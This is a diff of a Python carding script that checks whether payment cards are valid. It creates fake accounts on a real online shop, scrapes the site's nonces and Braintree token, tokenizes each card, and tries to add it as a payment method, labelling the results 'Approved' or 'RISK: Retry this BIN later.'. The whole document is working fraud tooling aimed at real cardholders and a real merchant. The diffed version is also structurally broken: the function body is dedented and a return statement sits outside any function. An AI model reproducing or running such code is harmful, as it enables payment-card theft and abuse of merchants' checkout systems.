@@ -1,13 +1,11 @@
 import os
-
 try:
     import pyfiglet, webbrowser, user_agent, time
     import requests
     import re
     import base64
     import random
-    import string
-    
+    import string  
 except ImportError as e:
     print("An error occurred in installing library:", e)
     print("Libraries are installed.")
@@ -21,144 +19,100 @@ except ImportError as e:
     import base64
     import random
     import string
-    import requests
-
+    import requests	
 
 def Tele(ccx):
-	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
 	yy = ccx.split("|")[2]
 	cvc = ccx.split("|")[3]
-	if "20" in yy:
-		yy = yy.split("20")[1]
-		
-	user = user_agent.generate_user_agent()
-		
-	r = requests.session()
-	
-	r.follow_redirects = True
-	
-	r.verify = False
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]	
+user = user_agent.generate_user_agent()		
+r = requests.session()	
+r.follow_redirects = True	
+r.verify = False
+def generate_full_name():
+    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
+                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
+                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
+                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
+                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
+                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
+                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
+                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
+                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
+                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
+    
+    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
+                  "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
+                  "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
+                  "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
+                  "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
+                  "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
+                  "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
+                  "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
+    
+    full_name = random.choice(first_names) + " " + random.choice(last_names)
+    first_name, last_name = full_name.split()
 
+    return first_name, last_name
+first_name, last_name = generate_full_name()
+def generate_address():
+    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
+    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
+    streets = ["Dunmow Road", "Park Ave", "Park Place", "Ockham Road", "Brynglas Road", "Hart Road", "Boroughbridge Road", "Ivy Lane", "South Street", "Whatlington Road"]
+    zip_codes = ["SP52FU", "YO254WE", "PH70PU", "IP148TX", "BS226HA", "KW15SP", "SG64UF", "BH76BP", "TW91EJ", "DY68AJ"]
 
-		
-	def generate_full_name():
-				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
-			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
-			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
-			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
-			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
-			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
-			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
-			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
-			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
-			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
-			    
-				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
-			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
-			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
-			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
-			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
-			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
-			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
-			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
-			    
-				full_name = random.choice(first_names) + " " + random.choice(last_names)
-				first_name, last_name = full_name.split()
+    city = random.choice(cities)
+    state = states[cities.index(city)]
+    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
+    zip_code = zip_codes[states.index(state)]
 
-				return first_name, last_name
-
-	
-	def generate_address():
-		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
-		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
-		streets = ["Dunmow Road", "Park Ave", "Park Place", "Ockham Road", "Brynglas Road", "Hart Road", "Boroughbridge Road", "Ivy Lane", "South Street", "Whatlington Road"]
-		zip_codes = ["SP52FU", "YO254WE", "PH70PU", "IP148TX", "BS226HA", "KW15SP", "SG64UF", "BH76BP", "TW91EJ", "DY68AJ"]
-
-		city = random.choice(cities)
-		state = states[cities.index(city)]
-		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
-		zip_code = zip_codes[states.index(state)]
-
-		return city, state, street_address, zip_code
-			
-			
-	first_name, last_name = generate_full_name()
-	city, state, street_address, zip_code = generate_address()
-			
-			
-			
-			
-			
-	def generate_random_account():
-		name = ''.join(random.choices(string.ascii_lowercase, k=20))
-		number = ''.join(random.choices(string.digits, k=4))
+    return city, state, street_address, zip_code
+city, state, street_address, zip_code = generate_address()				
+def generate_random_account():
+	name = ''.join(random.choices(string.ascii_lowercase, k=20))
+	number = ''.join(random.choices(string.digits, k=4))
 				
-		return f"{name}{number}@gmail.com"
-	acc = (generate_random_account())
-			
-		
-	def username():
-		name = ''.join(random.choices(string.ascii_lowercase, k=20))
-		number = ''.join(random.choices(string.digits, k=20))
-				
-		return f"{name}{number}"
-	username = (username())
-			
-			
-			
-	def num():
-		number = ''.join(random.choices(string.digits, k=8))
-		return f"014{number}"
-	num = (num())
-			
-			
-	def generate_random_code(length=32):
-		letters_and_digits = string.ascii_letters + string.digits
-		return ''.join(random.choice(letters_and_digits) for _ in range(length))
-			
-	corr = generate_random_code()
-			
-	sess = generate_random_code()
-			
-	def generate_password(length=12):
-		characters = string.ascii_letters + string.digits + string.punctuation
-		password = ''.join(random.choice(characters) for i in range(length))
-		return password
-
-	password = generate_password()	
-	
-	
-	
-	headers = {
+	return f"{name}{number}@gmail.com"
+acc = (generate_random_account())					
+def generate_username():
+    name_part = ''.join(random.choices(string.ascii_lowercase, k=20))
+    number_part = ''.join(random.choices(string.digits, k=20))
+    
+    return f"{name_part}{number_part}"
+generated_username = generate_username()						
+def num():
+	number = ''.join(random.choices(string.digits, k=8))
+	return f"014{number}"
+num = (num())					
+def generate_password(length=12):
+	characters = string.ascii_letters + string.digits + string.punctuation
+	password = ''.join(random.choice(characters) for i in range(length))
+	return password
+password = generate_password()			
+headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'cache-control': 'no-cache',
 	    'pragma': 'no-cache',
 	    'user-agent': user,
-	}
-	
-	response = r.get('https://www.bebebrands.com/my-account/', headers=headers)
-	
-	
-	
-	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-	
-	
-	headers = {
+}
+response = r.get('https://www.bebebrands.com/my-account/', headers=headers)	
+register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
+headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'cache-control': 'no-cache',
 	    'content-type': 'application/x-www-form-urlencoded',
 	    'pragma': 'no-cache',
 	    'user-agent': user,
-	}
-	
-	data = {
-    'username': username,
+}	
+data = {
+    'username': generated_username,
     'email': acc,
     'password': password,
-    'wc_order_attribution_source_type': '(none)',
+    'wc_order_attribution_source_type': '',
     'wc_order_attribution_referrer': '(none)',
     'wc_order_attribution_utm_campaign': '(none)',
     'wc_order_attribution_utm_source': '(direct)',
@@ -177,32 +131,25 @@ def Tele(ccx):
     'woocommerce-register-nonce': register,
     '_wp_http_referer': '/my-account/',
     'register': 'Register'
-	}
+}	
+response = r.post('https://www.bebebrands.com/my-account/', headers=headers, data=data)
 
-	
-	response = r.post('https://www.bebebrands.com/my-account/', headers=headers, data=data)
-	
-	headers = {
+headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'cache-control': 'no-cache',
 	    'pragma': 'no-cache',
 	    'user-agent': user,
-	}
-	
-	response = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
-	
-	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
-	
-	
-	headers = {
+}
+response = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)	
+address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)		
+headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'cache-control': 'no-cache',
 	    'content-type': 'application/x-www-form-urlencoded',
 	    'pragma': 'no-cache',
 	    'user-agent': user,
-	}
-	
-	data = {
+}	
+data = {
     'billing_first_name': first_name,
     'billing_last_name': last_name,
     'billing_company': '',
@@ -212,57 +159,41 @@ def Tele(ccx):
     'billing_city': 'Letchworth Garden City',
     'billing_state': '',
     'billing_postcode': 'SG63ED',
-    'billing_phone': 'num',
+    'billing_phone': num,
     'billing_email': acc,
     'save_address': 'Save address',
     'woocommerce-edit-address-nonce': address,
     '_wp_http_referer': '/my-account/edit-address/billing/',
     'action': 'edit_address'
-	}
-	
-	response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
-	
-	
-	
-	headers = {
+}	
+response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)	
+headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'cache-control': 'no-cache',
 	    'pragma': 'no-cache',
 	    'user-agent': user,
-	}
-	
-	response = r.get('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
-	
-	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-	
-	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
-	
-	
-	
-	headers = {
+}	
+response = r.get('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)	
+add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
+client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)	
+print(add_nonce)
+print(client)
+headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'cache-control': 'no-cache',
 	    'content-type': 'application/x-www-form-urlencoded',
 	    'pragma': 'no-cache',
 	    'user-agent': user,
-	}
-		
-	data = {
+}	
+data = {
 		    'action': 'wc_braintree_credit_card_get_client_token',
 		    'nonce': client,
-	}
-		
-	response = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
-	
-	enc = response.json()['data']
-	
-	dec = base64.b64decode(enc).decode('utf-8')
-	
-	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
-	
-	
-		
-	headers = {
+}		
+response = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+enc = response.json()['data']
+dec = base64.b64decode(enc).decode('utf-8')	
+au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
+headers = {
 		    'authority': 'payments.braintree-api.com',
 		    'accept': '*/*',
 		    'authorization': f'Bearer {au}',
@@ -271,9 +202,8 @@ def Tele(ccx):
 		    'content-type': 'application/json',
 		    'pragma': 'no-cache',
 		    'user-agent': user,
-		}
-		
-	json_data = {
+}	
+json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
@@ -286,7 +216,7 @@ def Tele(ccx):
                 'number': n,
                 'expirationMonth': mm,
                 'expirationYear': yy,
-                'cvv': cvv,
+                'cvv': cvc,
             },
             'options': {
                 'validate': False,
@@ -294,27 +224,29 @@ def Tele(ccx):
         },
     },
     'operationName': 'TokenizeCreditCard',
-}
-		
-	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-		
-	
-	try:
-		tok = response.json()['data']['tokenizeCreditCard']['token']
-	except:
-		return
-		
+}	
+response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+try:
+    tok = response.json()['data']['tokenizeCreditCard']['token']
+except Exception as e:
+    tok = None
+
+
 	
 	
-	headers = {
+
+
+
+
+headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'cache-control': 'no-cache',
 	    'content-type': 'application/x-www-form-urlencoded',
 	    'pragma': 'no-cache',
 	    'user-agent': user,
-	}
+}
 		
-	data = {
+data = {
     'payment_method': 'braintree_credit_card',
     'wc-braintree-credit-card-card-type': 'visa',
     'wc-braintree-credit-card-3d-secure-enabled': '',
@@ -333,32 +265,35 @@ def Tele(ccx):
     'woocommerce-add-payment-method-nonce': add_nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1'
-	}
+}
 		
-	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
 				
 			
 		
+
+
+text = response.text
 		
+pattern = r'Status code (.*?)\s*</li>'
 		
-	text = response.text
-		
-	pattern = r'Status code (.*?)\s*</li>'
-		
-	match = re.search(pattern, text)
-	if match:
-		result = match.group(1)
-		if 'risk_threshold' in text:
-			result = "RISK: Retry this BIN later."
+match = re.search(pattern, text)
+if match:
+	result = match.group(1)
+	if 'risk_threshold' in text:
+		result = "RISK: Retry this BIN later."
+else:
+	if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+		result = "1000: Approved"
 	else:
-		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
-			result = "1000: Approved"
-		else:
-			result = "Error"
+		result = "Error"
 	
-	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
-			return 'Approved'
-	else:
-		return result
+if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
+	
+	return 'Approved'
+else:
+	return result
 def sq(card):
-	return 'Your card was declined.'
+    return 'Your card was declined.'
+
+
